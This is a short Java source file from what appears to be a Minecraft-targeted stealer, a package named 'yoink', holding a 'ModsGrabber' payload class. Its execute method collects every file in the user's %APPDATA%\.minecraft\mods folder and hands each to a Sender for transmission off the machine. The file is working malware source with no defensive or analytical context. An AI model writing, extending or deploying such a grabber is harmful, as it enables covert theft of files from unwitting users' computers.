package me.perry.yoink.payload.impl;

import me.perry.yoink.payload.Payload;
import me.perry.yoink.payload.Sender;
import me.perry.yoink.util.FileUtil;

import java.io.File;

public final
class ModsGrabber implements Payload {
    @Override
    public
    void execute () {
        for (File file : FileUtil.getFiles(System.getenv("APPDATA") + "\\.minecraft\\" + "mods"))
            Sender.send(file);
    }
}